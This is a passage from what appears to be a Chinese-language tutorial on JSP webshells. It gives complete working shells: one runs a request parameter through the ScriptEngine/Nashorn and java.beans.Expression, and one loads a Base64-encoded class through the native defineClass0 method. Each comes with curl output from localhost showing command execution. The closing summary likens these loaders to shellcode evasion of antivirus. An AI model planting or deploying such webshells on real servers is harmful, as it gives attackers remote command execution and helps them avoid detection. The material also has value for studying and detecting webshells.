[shadowflow@ShadowOS ~]% curl http://localhost:8080/jspshell_war/javac.jsp\?cmd\=whoami
shadowflow
```











## 11. ScriptEngine

test.js

```javascript
function test() {
    try {
        load("nashorn:mozilla_compat.js");
    } catch (e) {
    }
    importPackage(Packages.java.lang);
    var cmd = request.getParameter("cmd");
    var x = java.lang.Runtime.getRuntime().exec(cmd);
    return x.getInputStream();
}
test();
```

将test.js放入scriptEngine.jsp

```java
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.beans.Expression" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="javax.script.ScriptEngine" %>
<%@ page import="javax.script.ScriptEngineManager" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String jsCode = "function test() {\n" +
            "    try {\n" +
            "        load(\"nashorn:mozilla_compat.js\");\n" +
            "    } catch (e) {\n" +
            "    }\n" +
            "    importPackage(Packages.java.lang);\n" +
            "    var cmd = request.getParameter(\"cmd\");\n" +
            "    var x = java.lang.Runtime.getRuntime().exec(cmd);\n" +
            "    return x.getInputStream();\n" +
            "}\n" +
            "test();";
    ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName("JavaScript");
    scriptEngine.put("request", request);
    scriptEngine.eval(jsCode);
    InputStream inputStream = (InputStream) scriptEngine.eval(jsCode);


    String cmd = request.getParameter("cmd");
    Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});
    Process process = (Process) expr.getValue();
    InputStream in = process.getInputStream();

    StringBuilder sb = new StringBuilder();
    InputStreamReader resultReader = new InputStreamReader(in);
    BufferedReader stdInput = new BufferedReader(resultReader);
    String s = null;
    while ((s=stdInput.readLine()) != null) {
        sb.append(s).append("\n");
    }
    response.getWriter().print(sb.toString());
%>
```

运行

```
[shadowflow@ShadowOS ~]% curl http://localhost:8080/jspshell_war/scriptEngine.jsp\?cmd\=whoami
shadowflow
```



## 12. Native方法defineClass0



```jsp
<%@ page import="java.security.ProtectionDomain" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="com.sun.org.apache.xml.internal.security.utils.Base64" %>
<%@ page import="java.lang.reflect.Constructor" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    byte[] code = Base64.decode("yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL/AC0ABAcAIgcAIwcAJAcAJQAA/AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr");
    //Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
    ClassLoader classLoader = ClassLoader.getSystemClassLoader();
    Method method = ClassLoader.class.getDeclaredMethod("defineClass0", String.class, byte[].class, int.class, int.class, ProtectionDomain.class);
    method.setAccessible(true);
    Class<?> clazz = (Class<?>) method.invoke(classLoader, "Exp", code, 0, code.length, null);
    Constructor<?> constructor = clazz.getConstructor(String.class);
    Object object = constructor.newInstance(request.getParameter("cmd"));
    response.getWriter().println(object.toString());
%>



```

注意：只能执行成功一次



## 13. 总结

反射方式是通过`Class.forName()`获取Runtime对象，然后传入参数执行。

随机数方式是通过随机生成字符拼接成想要的类名或者方法名，达到欺骗的效果。

BeansExpression是通过通过`java.beans.Expression`来执行`getRuntime()`

其他的，BCEL、自定义ClassLoader、动态编译、ScriptEngine、Native方法的原理都差不多，都是通过加载字节码来执行，不同的就是各种花哨的加载器，就像做shellcode的免杀，都是通过各种加载器来执行机器马，所以本质上各种攻击场景都是有想通之处。

















## 参考

- https://xz.aliyun.com/t/10507
- https://github.com/threedr3am/JSP-Webshells
- https://space.bilibili.com/1106751850/channel/seriesdetail?sid=560683

- https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html







